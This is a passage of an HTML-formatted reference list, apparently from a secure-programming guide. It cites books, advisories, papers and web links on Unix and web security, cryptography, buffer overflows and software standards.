>ftp://ftp.research.att.com/dist/mab/keylength.ps</A
>.</P
><P
>[CC 1999]
<EM
>The Common Criteria for Information Technology Security Evaluation
(CC)</EM
>.
August 1999.
Version 2.1.
Technically identical to International Standard ISO/IEC 15408:1999.
<A
HREF="http://csrc.nist.gov/cc"
TARGET="_top"
>http://csrc.nist.gov/cc</A
></P
><P
>[CERT 1998]
Computer Emergency Response Team (CERT) Coordination Center (CERT/CC).
February 13, 1998.
<EM
>Sanitizing User-Supplied Data in CGI Scripts</EM
>.
CERT Advisory CA-97.25.CGI_metachar.
<A
HREF="http://www.cert.org/advisories/CA-97.25.CGI_metachar.html"
TARGET="_top"
>http://www.cert.org/advisories/CA-97.25.CGI_metachar.html</A
>.</P
><P
>[Cheswick 1994]
Cheswick, William R. and Steven M. Bellovin.
Firewalls and Internet Security: Repelling the Wily Hacker.
Full text at
<A
HREF="http://www.wilyhacker.com"
TARGET="_top"
>http://www.wilyhacker.com</A
>.</P
><P
>[Clowes 2001]
Clowes, Shaun.
2001.
<SPAN
CLASS="QUOTE"
>&#8220;A Study In Scarlet - Exploiting Common Vulnerabilities in PHP&#8221;</SPAN
>
<A
HREF="http://www.securereality.com.au/archives.html"
TARGET="_top"
>http://www.securereality.com.au/archives.html</A
></P
><P
>[CMU 1998]
Carnegie Mellon University (CMU).
February 13, 1998
Version 1.4.
<SPAN
CLASS="QUOTE"
>&#8220;How To Remove Meta-characters From User-Supplied Data In CGI Scripts&#8221;</SPAN
>.
<A
HREF="ftp://ftp.cert.org/pub/tech_tips/cgi_metacharacters"
TARGET="_top"
>ftp://ftp.cert.org/pub/tech_tips/cgi_metacharacters</A
>.</P
><P
>[Cowan 1999]
Cowan, Crispin, Perry Wagle, Calton Pu, Steve Beattie, and
Jonathan Walpole.
<SPAN
CLASS="QUOTE"
>&#8220;Buffer Overflows: Attacks and Defenses for the Vulnerability
of the Decade&#8221;</SPAN
>.
Proceedings of DARPA Information Survivability Conference and Expo (DISCEX),
<A
HREF="http://schafercorp-ballston.com/discex"
TARGET="_top"
>http://schafercorp-ballston.com/discex</A
>
SANS 2000.
<A
HREF="http://www.sans.org/newlook/events/sans2000.htm"
TARGET="_top"
>http://www.sans.org/newlook/events/sans2000.htm</A
>.
For a copy, see
<A
HREF="http://immunix.org/documentation.html"
TARGET="_top"
>http://immunix.org/documentation.html</A
>.</P
><P
>[Cox 2000]
Cox, Philip.
March 30, 2001.
Hardening Windows 2000.
<A
HREF="http://www.systemexperts.com/win2k/hardenW2K11.pdf"
TARGET="_top"
>http://www.systemexperts.com/win2k/hardenW2K11.pdf</A
>.</P
><P
>[Crosby 2003]
Crosby, Scott A., and Dan S Wallach.
"Denial of Service via Algorithmic Complexity Attacks"
Usenix Security 2003.
<A
HREF="http://www.cs.rice.edu/~scrosby/hash"
TARGET="_top"
>http://www.cs.rice.edu/~scrosby/hash</A
>.</P
><P
>[Dobbertin 1996].
Dobbertin, H.
1996.
The Status of MD5 After a Recent Attack.
RSA Laboratories&#8217; CryptoBytes.
Vol. 2, No. 2.</P
><P
>[Felten 1997]
Edward W. Felten, Dirk Balfanz, Drew Dean, and Dan S. Wallach.
Web Spoofing: An Internet Con Game
Technical Report 540-96 (revised Feb. 1997)
Department of Computer Science, Princeton University
<A
HREF="http://www.cs.princeton.edu/sip/pub/spoofing.pdf"
TARGET="_top"
>http://www.cs.princeton.edu/sip/pub/spoofing.pdf</A
></P
><P
>[Fenzi 1999]
Fenzi, Kevin, and Dave Wrenski.
April 25, 1999.
<EM
>Linux Security HOWTO</EM
>.
Version 1.0.2.
<A
HREF="http://www.tldp.org/HOWTO/Security-HOWTO.html"
TARGET="_top"
>http://www.tldp.org/HOWTO/Security-HOWTO.html</A
></P
><P
>[FHS 1997]
Filesystem Hierarchy Standard (FHS 2.0).
October 26, 1997.
Filesystem Hierarchy Standard Group, edited by Daniel Quinlan.
Version 2.0.
<A
HREF="http://www.pathname.com/fhs"
TARGET="_top"
>http://www.pathname.com/fhs</A
>.</P
><P
>[Filipski 1986]
Filipski, Alan and James Hanko.
April 1986.
<SPAN
CLASS="QUOTE"
>&#8220;Making Unix Secure.&#8221;</SPAN
>
Byte (Magazine).
Peterborough, NH: McGraw-Hill Inc.
Vol. 11, No. 4.
ISSN 0360-5280.
pp. 113-128.</P
><P
>[Flake 2001]
Flake, Havlar.
Auditing Binaries for Security Vulnerabilities.
<A
HREF="http://www.blackhat.com/html/win-usa-01/win-usa-01-speakers.html"
TARGET="_top"
>http://www.blackhat.com/html/win-usa-01/win-usa-01-speakers.html</A
>.</P
><P
>[FOLDOC]
Free On-Line Dictionary of Computing.
<A
HREF="http://foldoc.doc.ic.ac.uk/foldoc/index.html"
TARGET="_top"
>http://foldoc.doc.ic.ac.uk/foldoc/index.html</A
>.</P
><P
>[Forristal 2001]
Forristal, Jeff, and Greg Shipley.
January 8, 2001.
Vulnerability Assessment Scanners.
Network Computing.
<A
HREF="http://www.nwc.com/1201/1201f1b1.html"
TARGET="_top"
>http://www.nwc.com/1201/1201f1b1.html</A
></P
><P
>[FreeBSD 1999]
FreeBSD, Inc.
1999.
<SPAN
CLASS="QUOTE"
>&#8220;Secure Programming Guidelines&#8221;</SPAN
>.
<EM
>FreeBSD Security Information</EM
>.
<A
HREF="http://www.freebsd.org/security/security.html"
TARGET="_top"
>http://www.freebsd.org/security/security.html</A
></P
><P
>[Friedl 1997]
Friedl, Jeffrey E. F.
1997.
Mastering Regular Expressions.
O&#8217;Reilly.
ISBN 1-56592-257-3.</P
><P
>[FSF 1998]
Free Software Foundation.
December 17, 1999.
<EM
>Overview of the GNU Project</EM
>.
<A
HREF="http://www.gnu.ai.mit.edu/gnu/gnu-history.html"
TARGET="_top"
>http://www.gnu.ai.mit.edu/gnu/gnu-history.html</A
></P
><P
>[FSF 1999]
Free Software Foundation.
January 11, 1999.
<EM
>The GNU C Library Reference Manual</EM
>.
Edition 0.08 DRAFT, for Version 2.1 Beta of the GNU C Library. 
Available at, for example,
<A
HREF="http://www.netppl.fi/~pp/glibc21/libc_toc.html"
TARGET="_top"
>http://www.netppl.fi/~pp/glibc21/libc_toc.html</A
></P
><P
>[Fu 2001]
Fu, Kevin, Emil Sit, Kendra Smith, and Nick Feamster.
August 2001.
<SPAN
CLASS="QUOTE"
>&#8220;Dos and Don&#8217;ts of Client Authentication on the Web&#8221;</SPAN
>.
Proceedings of the 10th USENIX Security Symposium,
Washington, D.C., August 2001.
<A
HREF="http://cookies.lcs.mit.edu/pubs/webauth.html"
TARGET="_top"
>http://cookies.lcs.mit.edu/pubs/webauth.html</A
>.</P
><P
>[Gabrilovich 2002]
Gabrilovich, Evgeniy, and Alex Gontmakher.
February 2002.
<SPAN
CLASS="QUOTE"
>&#8220;Inside Risks: The Homograph Attack&#8221;</SPAN
>.
Communications of the ACM.
Volume 45, Number 2.
Page 128.&#13;</P
><P
>[Galvin 1998a]
Galvin, Peter.
April 1998.
<SPAN
CLASS="QUOTE"
>&#8220;Designing Secure Software&#8221;</SPAN
>.
<EM
>Sunworld</EM
>.
<A
HREF="http://www.sunworld.com/swol-04-1998/swol-04-security.html"
TARGET="_top"
>http://www.sunworld.com/swol-04-1998/swol-04-security.html</A
>.</P
><P
>[Galvin 1998b]
Galvin, Peter.
August 1998.
<SPAN
CLASS="QUOTE"
>&#8220;The Unix Secure Programming FAQ&#8221;</SPAN
>.
<EM
>Sunworld</EM
>.
<A
HREF="http://www.sunworld.com/sunworldonline/swol-08-1998/swol-08-security.html"
TARGET="_top"
>http://www.sunworld.com/sunworldonline/swol-08-1998/swol-08-security.html</A
></P
><P
>[Garfinkel 1996]
Garfinkel, Simson and Gene Spafford.
April 1996.
<EM
>Practical UNIX &#38; Internet Security, 2nd Edition</EM
>.
ISBN 1-56592-148-8.
Sebastopol, CA: O&#8217;Reilly &#38; Associates, Inc. 
<A
HREF="http://www.oreilly.com/catalog/puis"
TARGET="_top"
>http://www.oreilly.com/catalog/puis</A
></P
><P
>[Garfinkle 1997]
Garfinkle, Simson.
August 8, 1997.
21 Rules for Writing Secure CGI Programs.
<A
HREF="http://webreview.com/wr/pub/97/08/08/bookshelf"
TARGET="_top"
>http://webreview.com/wr/pub/97/08/08/bookshelf</A
></P
><P
>[Gay 2000]
Gay, Warren W.
October 2000.
Advanced Unix Programming.
Indianapolis, Indiana: Sams Publishing.
ISBN 0-67231-990-X.</P
><P
>[Geodsoft 2001]
Geodsoft.
February 7, 2001.
Hardening OpenBSD Internet Servers.
<A
HREF="http://www.geodsoft.com/howto/harden"
TARGET="_top"
>http://www.geodsoft.com/howto/harden</A
>.</P
><P
>[Graham 1999]
Graham, Jeff.
May 4, 1999.
<EM
>Security-Audit&#8217;s Frequently Asked Questions (FAQ)</EM
>.
<A
HREF="http://lsap.org/faq.txt"
TARGET="_top"
>http://lsap.org/faq.txt</A
></P
><P
>[Gong 1999]
Gong, Li.
June 1999.
<EM
>Inside Java 2 Platform Security</EM
>.
Reading, MA: Addison Wesley Longman, Inc.
ISBN 0-201-31000-7.</P
><P
>[Gundavaram Unknown]
Gundavaram, Shishir, and Tom Christiansen.
Date Unknown.
<EM
>Perl CGI Programming FAQ</EM
>.
<A
HREF="http://language.perl.com/CPAN/doc/FAQs/cgi/perl-cgi-faq.html"
TARGET="_top"
>http://language.perl.com/CPAN/doc/FAQs/cgi/perl-cgi-faq.html</A
></P
><P
>[Hall 1999]
Hall, Brian "Beej".
Beej&#8217;s Guide to Network Programming Using Internet Sockets.
13-Jan-1999.
Version 1.5.5.
<A
HREF="http://www.ecst.csuchico.edu/~beej/guide/net"
TARGET="_top"
>http://www.ecst.csuchico.edu/~beej/guide/net</A
></P
><P
>[Howard 2002]
Howard, Michael and David LeBlanc.
2002.
Writing Secure Code.
Redmond, Washington: Microsoft Press.
ISBN 0-7356-1588-8.</P
><P
>[ISO 12207]
International Organization for Standardization (ISO).
1995.
Information technology -- Software life cycle processes
ISO/IEC 12207:1995.</P
><P
>[ISO 13335]
International Organization for Standardization (ISO).
ISO/IEC TR 13335.
Guidelines for the Management of IT Security (GMITS).
Note that this is a five-part technical report (not a standard); see also
ISO/IEC 17799:2000.
It includes:
<P
></P
><UL
><LI
><P
>         ISO 13335-1: Concepts and Models for IT Security</P
></LI
><LI
><P
>         ISO 13335-2: Managing and Planning IT Security</P
></LI
><LI
><P
>         ISO 13335-3: Techniques for the Management of IT Security</P
></LI
><LI
><P
>         ISO 13335-4: Selection of Safeguards</P
></LI
><LI
><P
>         ISO 13335-5: Safeguards for External Connections</P
></LI
></UL
></P
><P
>[ISO 17799]
International Organization for Standardization (ISO).
December 2000.
Code of Practice for Information Security Management.
ISO/IEC 17799:2000.</P
><P
>[ISO 9000]
International Organization for Standardization (ISO).
2000.
Quality management systems - Fundamentals and vocabulary.
ISO 9000:2000.
See
<A
HREF="http://www.iso.ch/iso/en/iso9000-14000/iso9000/selection_use/iso9000family.html"
TARGET="_top"
>http://www.iso.ch/iso/en/iso9000-14000/iso9000/selection_use/iso9000family.html</A
></P
><P
>[ISO 9001]
International Organization for Standardization (ISO).
2000.
Quality management systems - Requirements
ISO 9001:2000</P
><P
>[Jones 2000]
Jones, Jennifer.
October 30, 2000.
<SPAN
CLASS="QUOTE"
>&#8220;Banking on Privacy&#8221;</SPAN
>.
InfoWorld, Volume 22, Issue 44.
San Mateo, CA: International Data Group (IDG).
pp. 1-12.</P
><P
>[Kelsey 1998]
Kelsey, J., B. Schneier, D. Wagner, and C. Hall.
March 1998.
"Cryptanalytic Attacks on Pseudorandom Number Generators."
Fast Software Encryption, Fifth International Workshop Proceedings
(March 1998), Springer-Verlag, 1998, pp. 168-188.
<A
HREF="http://www.counterpane.com/pseudorandom_number.html"
TARGET="_top"
>http://www.counterpane.com/pseudorandom_number.html</A
>.</P
><P
>[Kernighan 1988]
Kernighan, Brian W., and Dennis M. Ritchie.
1988.
<EM
>The C Programming Language</EM
>.
Second Edition.
Englewood Cliffs, NJ: Prentice-Hall.
ISBN 0-13-110362-8.</P
><P
>[Kim 1996]
Kim, Eugene Eric.
1996.
<EM
>CGI Developer&#8217;s Guide</EM
>.
SAMS.net Publishing.
ISBN: 1-57521-087-8
<A
HREF="http://www.eekim.com/pubs/cgibook"
TARGET="_top"
>http://www.eekim.com/pubs/cgibook</A
></P
><P
>[Kiriansky 2002]
Kiriansky, Vladimir, Derek Bruening, Saman Amarasinghe.
"Secure Execution Via Program Shepherding".
Proceedings of the 11th USENIX Security Symposium, San Francisco,
California, August 2002.
<A
HREF="http://cag.lcs.mit.edu/commit/papers/02/RIO-security-usenix.pdf"
TARGET="_top"
>http://cag.lcs.mit.edu/commit/papers/02/RIO-security-usenix.pdf</A
></P
><P
>Kolsek [2002]
Kolsek, Mitja. December 2002.
Session Fixation Vulnerability in Web-based Applications
<A
HREF="http://www.acros.si/papers/session_fixation.pdf"
TARGET="_top"
>http://www.acros.si/papers/session_fixation.pdf</A
>.</P
><P
>[Kuchling 2000].
Kuchling, A.M.
2000.
Restricted Execution HOWTO.
<A
HREF="http://www.python.org/doc/howto/rexec/rexec.html"
TARGET="_top"
>http://www.python.org/doc/howto/rexec/rexec.html</A
></P
><P
>[Kuhn 2002]
Kuhn, Markus G.
Optical Time-Domain Eavesdropping Risks
of CRT displays.
Proceedings of the 2002 IEEE Symposium on Security and Privacy,
Oakland, CA, May 12-15, 2002.
<A
HREF="http://www.cl.cam.ac.uk/~mgk25/ieee02-optical.pdf"
TARGET="_top"
>http://www.cl.cam.ac.uk/~mgk25/ieee02-optical.pdf</A
></P
><P
>[Landau 2004]
Landau, Susan.
Polynomials in the Nation&#8217;s Service:
Using Algebra to Design the Advanced Encryption Standard.
2004.
American Mathematical Monthly.
<A
HREF="http://research.sun.com/people/slandau/maa1.pdf"
TARGET="_top"
>http://research.sun.com/people/slandau/maa1.pdf</A
></P
><P
>[LSD 2001]
The Last Stage of Delirium.
July 4, 2001.
<EM
>UNIX Assembly Codes Development
for Vulnerabilities Illustration Purposes.</EM
>
<A
HREF="http://lsd-pl.net/papers.html#assembly"
TARGET="_top"
>http://lsd-pl.net/papers.html#assembly</A
>.</P
><P
>[McClure 1999]
McClure, Stuart, Joel Scambray, and George Kurtz.
1999.
<EM
>Hacking Exposed: Network Security Secrets and Solutions</EM
>.
Berkeley, CA: Osbourne/McGraw-Hill.
ISBN 0-07-212127-0.</P
><P
>[McKusick 1999]
McKusick, Marshall Kirk.
January 1999.
<SPAN
CLASS="QUOTE"
>&#8220;Twenty Years of Berkeley Unix: From AT&#38;T-Owned to
Freely Redistributable.&#8221;</SPAN
>
<EM
>Open Sources: Voices from the Open Source Revolution</EM
>.
<A
HREF="http://www.oreilly.com/catalog/opensources/book/kirkmck.html"
TARGET="_top"
>http://www.oreilly.com/catalog/opensources/book/kirkmck.html</A
>.</P
><P
>[McGraw 1999]
McGraw, Gary, and Edward W. Felten.
December 1998.
Twelve Rules for developing more secure Java code.
Javaworld.
<A
HREF="http://www.javaworld.com/javaworld/jw-12-1998/jw-12-securityrules.html"
TARGET="_top"
>http://www.javaworld.com/javaworld/jw-12-1998/jw-12-securityrules.html</A
>.</P
><P
>[McGraw 1999]
McGraw, Gary, and Edward W. Felten.
January 25, 1999.
Securing Java: Getting Down to Business with Mobile Code, 2nd Edition 
John Wiley &#38; Sons.
ISBN 047131952X.
<A
HREF="http://www.securingjava.com"
TARGET="_top"
>http://www.securingjava.com</A
>.</P
><P
>[McGraw 2000a]
McGraw, Gary and John Viega.
March 1, 2000.
Make Your Software Behave: Learning the Basics of Buffer Overflows.
<A
HREF="http://www-4.ibm.com/software/developer/library/overflows/index.html"
TARGET="_top"
>http://www-4.ibm.com/software/developer/library/overflows/index.html</A
>.</P
><P
>[McGraw 2000b]
McGraw, Gary and John Viega.
April 18, 2000.
Make Your Software Behave: Software strategies
In the absence of hardware,
you can devise a reasonably secure random number generator through software.
<A
HREF="http://www-106.ibm.com/developerworks/library/randomsoft/index.html?dwzone=security"
TARGET="_top"
>http://www-106.ibm.com/developerworks/library/randomsoft/index.html?dwzone=security</A
>.</P
><P
>[Miller 1995]
Miller, Barton P.,
David Koski, Cjin Pheow Lee, Vivekananda Maganty,
Ravi Murthy, Ajitkumar Natarajan, and Jeff Steidl.
1995.
Fuzz Revisited: A Re-examination of the Reliability of
UNIX Utilities and Services.
<A
HREF="ftp://grilled.cs.wisc.edu/technical_papers/fuzz-revisited.pdf"
TARGET="_top"
>ftp://grilled.cs.wisc.edu/technical_papers/fuzz-revisited.pdf</A
>.</P
><P
>[Miller 1999]
Miller, Todd C. and Theo de Raadt.
<SPAN
CLASS="QUOTE"
>&#8220;strlcpy and strlcat -- Consistent, Safe, String Copy and Concatenation&#8221;</SPAN
>
<EM
>Proceedings of Usenix &#8217;99</EM
>.
<A
HREF="http://www.usenix.org/events/usenix99/millert.html"
TARGET="_top"
>http://www.usenix.org/events/usenix99/millert.html</A
> and
<A
HREF="http://www.usenix.org/events/usenix99/full_papers/millert/PACKING_LIST"
TARGET="_top"
>http://www.usenix.org/events/usenix99/full_papers/millert/PACKING_LIST</A
></P
><P
>[Mookhey 2002]
Mookhey, K. K.
The Unix Auditor&#8217;s Practical Handbook.
<A
HREF="http://www.nii.co.in/tuaph.html"
TARGET="_top"
>http://www.nii.co.in/tuaph.html</A
>.</P
><P
>[MISRA 1998]
Guidelines for the use of the C language in Vehicle Based Software
April 1998
The Motor Industry Software Reliability Association (MISRA)
<A
HREF="http://www.misra.org.uk"
TARGET="_top"
>http://www.misra.org.uk</A
></P
><P
>[Mudge 1995]
Mudge.
October 20, 1995.
<EM
>How to write Buffer Overflows</EM
>.
l0pht advisories.
<A
HREF="http://www.l0pht.com/advisories/bufero.html"
TARGET="_top"
>http://www.l0pht.com/advisories/bufero.html</A
>.</P
><P
>[Murhammer 1998]
Murhammer, Martin W., Orcun Atakan, Stefan Bretz,
Larry R. Pugh, Kazunari Suzuki, and David H. Wood.
October 1998.
TCP/IP Tutorial and Technical Overview
IBM International Technical Support Organization.
<A
HREF="http://www.redbooks.ibm.com/pubs/pdfs/redbooks/gg243376.pdf"
TARGET="_top"
>http://www.redbooks.ibm.com/pubs/pdfs/redbooks/gg243376.pdf</A
></P
><P
>[NCSA]
NCSA Secure Programming Guidelines.
<A
HREF="http://www.ncsa.uiuc.edu/General/Grid/ACES/security/programming"
TARGET="_top"
>http://www.ncsa.uiuc.edu/General/Grid/ACES/security/programming</A
>.</P
><P
>[Neumann 2000]
Neumann, Peter.
2000.
"Robust Nonproprietary Software."
Proceedings of the 2000 IEEE Symposium on Security and Privacy
(the <SPAN
CLASS="QUOTE"
>&#8220;Oakland Conference&#8221;</SPAN
>), May 14-17, 2000, Berkeley, CA.
Los Alamitos, CA: IEEE Computer Society.
pp.122-123.</P
><P
>[NSA 2000]
National Security Agency (NSA).
September 2000.
Information Assurance Technical Framework (IATF).
<A
HREF="http://www.iatf.net"
TARGET="_top"
>http://www.iatf.net</A
>.</P
><P
>[Open Group 1997]
The Open Group.
1997.
<EM
>Single UNIX Specification, Version 2 (UNIX 98)</EM
>.
<A
HREF="http://www.opengroup.org/online-pubs?DOC=007908799"
TARGET="_top"
>http://www.opengroup.org/online-pubs?DOC=007908799</A
>.</P
><P
>[OSI 1999]
Open Source Initiative.
1999.
<EM
>The Open Source Definition</EM
>.
<A
HREF="http://www.opensource.org/osd.html"
TARGET="_top"
>http://www.opensource.org/osd.html</A
>.</P
><P
>[Opplinger 1998]
Oppliger, Rolf.
1998.
Internet and Intranet Security.
Norwood, MA: Artech House.
ISBN 0-89006-829-1.</P
><P
>[Paulk 1993a]
Mark C. Paulk, Bill Curtis, Mary Beth Chrissis, and Charles V. Weber.
Capability Maturity Model for Software, Version 1.1.
Software Engineering Institute, CMU/SEI-93-TR-24.
DTIC Number ADA263403, February 1993. 
<A
HREF="http://www.sei.cmu.edu/activities/cmm/obtain.cmm.html"
TARGET="_top"
>http://www.sei.cmu.edu/activities/cmm/obtain.cmm.html</A
>.</P
><P
>[Paulk 1993b]
Mark C. Paulk, Charles V. Weber, Suzanne M. Garcia, Mary Beth Chrissis, and Marilyn W.  Bush.
Key Practices of the Capability Maturity Model, Version 1.1.
Software Engineering Institute.
CMU/SEI-93-TR-25, DTIC Number ADA263432, February 1993. </P
><P
>[Peteanu 2000]
Peteanu, Razvan.
July 18, 2000.
Best Practices for Secure Web Development.
<A
HREF="http://members.home.net/razvan.peteanu"
TARGET="_top"
>http://members.home.net/razvan.peteanu</A
></P
><P
>[Pfleeger 1997]
Pfleeger, Charles P.
1997.
<EM
>Security in Computing.</EM
>
Upper Saddle River, NJ: Prentice-Hall PTR.
ISBN 0-13-337486-6.</P
><P
>[Phillips 1995]
Phillips, Paul.
September 3, 1995.
<EM
>Safe CGI Programming</EM
>.
<A
HREF="http://www.go2net.com/people/paulp/cgi-security/safe-cgi.txt"
TARGET="_top"
>http://www.go2net.com/people/paulp/cgi-security/safe-cgi.txt</A
></P
><P
>[Quintero 1999]
Quintero, Federico Mena,
Miguel de Icaza, and Morten Welinder
GNOME Programming Guidelines
<A
HREF="http://developer.gnome.org/doc/guides/programming-guidelines/book1.html"
TARGET="_top"
>http://developer.gnome.org/doc/guides/programming-guidelines/book1.html</A
></P
><P
>[Raymond 1997]
Raymond, Eric.
1997.
<EM
>The Cathedral and the Bazaar</EM
>.
<A
HREF="http://www.catb.org/~esr/writings/cathedral-bazaar"
TARGET="_top"
>http://www.catb.org/~esr/writings/cathedral-bazaar</A
></P
><P
>[Raymond 1998]
Raymond, Eric.
April 1998.
<EM
>Homesteading the Noosphere</EM
>.
<A
HREF="http://www.catb.org/~esr/writings/homesteading"
TARGET="_top"
>http://www.catb.org/~esr/writings/homesteading</A
></P
><P
>[Ranum 1998]
Ranum, Marcus J.
1998.
<EM
>Security-critical coding for programmers -
a C and UNIX-centric full-day tutorial</EM
>.
<A
HREF="http://www.clark.net/pub/mjr/pubs/pdf/"
TARGET="_top"
>http://www.clark.net/pub/mjr/pubs/pdf/</A
>.</P
><P
>[RFC 822]
August 13, 1982
<EM
>Standard for the Format of ARPA Internet Text Messages</EM
>.
IETF RFC 822.
<A
HREF="http://www.ietf.org/rfc/rfc0822.txt"
TARGET="_top"
>http://www.ietf.org/rfc/rfc0822.txt</A
>.</P
><P
>[rfp 1999]
rain.forest.puppy.
1999.
<SPAN
CLASS="QUOTE"
>&#8220;Perl CGI problems&#8221;</SPAN
>.
<EM
>Phrack Magazine</EM
>.
Issue 55, Article 07.
<A
HREF="http://www.phrack.com/search.phtml?view&#38;article=p55-7"
TARGET="_top"
>http://www.phrack.com/search.phtml?view&#38;article=p55-7</A
> or
<A
HREF="http://www.insecure.org/news/P55-07.txt"
TARGET="_top"
>http://www.insecure.org/news/P55-07.txt</A
>.</P
><P
>[Rijmen 2000]
Rijmen, Vincent.
"LinuxSecurity.com Speaks With AES Winner".
<A
HREF="http://www.linuxsecurity.com/feature_stories/interview-aes-3.html"
TARGET="_top"
>http://www.linuxsecurity.com/feature_stories/interview-aes-3.html</A
>.</P
><P
>[Rochkind 1985].
Rochkind, Marc J.
<EM
>Advanced Unix Programming</EM
>.
Englewood Cliffs, NJ: Prentice-Hall, Inc.
ISBN 0-13-011818-4.</P
><P
>[Sahu 2002]
Sahu, Bijaya Nanda,
Srinivasan S. Muthuswamy,
Satya Nanaji Rao Mallampalli, and
Venkata R. Bonam.
July 2002
<SPAN
CLASS="QUOTE"
>&#8220;Is your Java code secure -- or exposed? 
Build safer applications now to avoid trouble later&#8221;</SPAN
>
<A
HREF="http://www-106.ibm.com/developerworks/java/library/j-staticsec.html?loc=dwmain"
TARGET="_top"
>http://www-106.ibm.com/developerworks/java/library/j-staticsec.html?loc=dwmain</A
></P
><P
>[St. Laurent 2000]
St. Laurent, Simon.
February 2000.
<EM
>XTech 2000 Conference Reports</EM
>.
<SPAN
CLASS="QUOTE"
>&#8220;When XML Gets Ugly&#8221;</SPAN
>.
<A
HREF="http://www.xml.com/pub/2000/02/xtech/megginson.html"
TARGET="_top"
>http://www.xml.com/pub/2000/02/xtech/megginson.html</A
>.</P
><P
>[Saltzer 1974]
Saltzer, J.
July 1974.
<SPAN
CLASS="QUOTE"
>&#8220;Protection and the Control of Information Sharing in MULTICS&#8221;</SPAN
>.
<EM
>Communications of the ACM</EM
>.
v17 n7.
pp. 388-402.</P
><P
>[Saltzer 1975]
Saltzer, J., and M. Schroeder.
September 1975.
<SPAN
CLASS="QUOTE"
>&#8220;The Protection of Information in Computing Systems&#8221;</SPAN
>.
<EM
>Proceedings of the IEEE</EM
>.
v63 n9.
pp. 1278-1308.
<A
HREF="http://www.mediacity.com/~norm/CapTheory/ProtInf"
TARGET="_top"
>http://www.mediacity.com/~norm/CapTheory/ProtInf</A
>.
Summarized in [Pfleeger 1997, 286].</P
><P
>[Schneider 2000]
Schneider, Fred B.
2000.
"Open Source in Security: Visting the Bizarre."
Proceedings of the 2000 IEEE Symposium on Security and Privacy
(the <SPAN
CLASS="QUOTE"
>&#8220;Oakland Conference&#8221;</SPAN
>), May 14-17, 2000, Berkeley, CA.
Los Alamitos, CA: IEEE Computer Society.
pp.126-127.</P
><P
>[Schneier 1996]
Schneier, Bruce.
1996.
<EM
>Applied Cryptography, Second Edition:
Protocols, Algorithms, and Source Code in C</EM
>.
New York: John Wiley and Sons.
ISBN 0-471-12845-7.</P
><P
>[Schneier 1998]
Schneier, Bruce and Mudge.
November 1998.
<EM
>Cryptanalysis of Microsoft&#8217;s Point-to-Point Tunneling Protocol (PPTP)</EM
>
Proceedings of the 5th ACM Conference on Communications and Computer Security,
ACM Press.
<A
HREF="http://www.counterpane.com/pptp.html"
TARGET="_top"
>http://www.counterpane.com/pptp.html</A
>.</P
><P
>[Schneier 1999]
Schneier, Bruce.
September 15, 1999.
<SPAN
CLASS="QUOTE"
>&#8220;Open Source and Security&#8221;</SPAN
>.
<EM
>Crypto-Gram</EM
>.
Counterpane Internet Security, Inc.
<A
HREF="http://www.counterpane.com/crypto-gram-9909.html"
TARGET="_top"
>http://www.counterpane.com/crypto-gram-9909.html</A
></P
><P
>[Seifried 1999]
Seifried, Kurt.
October 9, 1999.
<EM
>Linux Administrator&#8217;s Security Guide</EM
>.
<A
HREF="http://www.securityportal.com/lasg"
TARGET="_top"
>http://www.securityportal.com/lasg</A
>.</P
><P
>[Seifried 2001]
Seifried, Kurt.
September 2, 2001.
WWW Authentication
<A
HREF="http://www.seifried.org/security/www-auth/index.html"
TARGET="_top"
>http://www.seifried.org/security/www-auth/index.html</A
>.</P
><P
>[Shankland 2000]
Shankland, Stephen.
<SPAN
CLASS="QUOTE"
>&#8220;Linux poses increasing threat to Windows 2000&#8221;</SPAN
>.
CNET.
<A
HREF="http://news.cnet.com/news/0-1003-200-1549312.html"
TARGET="_top"
>http://news.cnet.com/news/0-1003-200-1549312.html</A
></P
><P
>[Shostack 1999]
Shostack, Adam.
June 1, 1999.
<EM
>Security Code Review Guidelines</EM
>.
<A
HREF="http://www.homeport.org/~adam/review.html"
TARGET="_top"
>http://www.homeport.org/~adam/review.html</A
>.</P
><P
>[Sibert 1996]
Sibert, W. Olin.
Malicious Data and Computer Security.
(NIST) NISSC &#8217;96.
<A
HREF="http://www.fish.com/security/maldata.html"
TARGET="_top"
>http://www.fish.com/security/maldata.html</A
></P
><P
>[Sitaker 1999]
Sitaker, Kragen.
Feb 26, 1999.
<EM
>How to Find Security Holes</EM
>
<A
HREF="http://www.pobox.com/~kragen/security-holes.html"
TARGET="_top"
>http://www.pobox.com/~kragen/security-holes.html</A
> and
<A
HREF="http://www.dnaco.net/~kragen/security-holes.html"
TARGET="_top"
>http://www.dnaco.net/~kragen/security-holes.html</A
></P
><P
>[SSE-CMM 1999]
SSE-CMM Project.
April 1999.
<EM
>Systems Security Engineering Capability Maturity Model (SSE CMM)
Model Description Document</EM
>.
Version 2.0.
<A
HREF="http://www.sse-cmm.org"
TARGET="_top"
>http://www.sse-cmm.org</A
></P
><P
>[Stallings 1996]
Stallings, William.
Practical Cryptography for Data Internetworks.
Los Alamitos, CA: IEEE Computer Society Press.
ISBN 0-8186-7140-8.</P
><P
>[Stein 1999].
Stein, Lincoln D.
September 13, 1999.
<EM
>The World Wide Web Security FAQ</EM
>.
Version 2.0.1
<A
HREF="http://www.w3.org/Security/Faq/www-security-faq.html"
TARGET="_top"
>http://www.w3.org/Security/Faq/www-security-faq.html</A
></P
><P
>[Swan 2001]
Swan, Daniel.
January 6, 2001. 
comp.os.linux.security FAQ.
Version 1.0.
<A
HREF="http://www.linuxsecurity.com/docs/colsfaq.html"
TARGET="_top"
>http://www.linuxsecurity.com/docs/colsfaq.html</A
>.</P
><P
>[Swanson 1996]
Swanson, Marianne, and Barbara Guttman.
September 1996.
Generally Accepted Principles and Practices for Securing
Information Technology Systems.
NIST Computer Security Special Publication (SP) 800-14.
<A
HREF="http://csrc.nist.gov/publications/nistpubs/index.html"
TARGET="_top"
>http://csrc.nist.gov/publications/nistpubs/index.html</A
>.</P
><P
>[Thompson 1974]
Thompson, K. and D.M. Richie.
July 1974.
<SPAN
CLASS="QUOTE"
>&#8220;The UNIX Time-Sharing System&#8221;</SPAN
>.
<EM
>Communications of the ACM</EM
>
Vol. 17, No. 7.
pp. 365-375.</P
><P
>[Torvalds 1999]
Torvalds, Linus.
February 1999.
<SPAN
CLASS="QUOTE"
>&#8220;The Story of the Linux Kernel&#8221;</SPAN
>.
<EM
>Open Sources: Voices from the Open Source Revolution</EM
>.
Edited by Chris Dibona, Mark Stone, and Sam Ockman.
O&#8217;Reilly and Associates.
ISBN 1565925823.
<A
HREF="http://www.oreilly.com/catalog/opensources/book/linus.html"
TARGET="_top"
>http://www.oreilly.com/catalog/opensources/book/linus.html</A
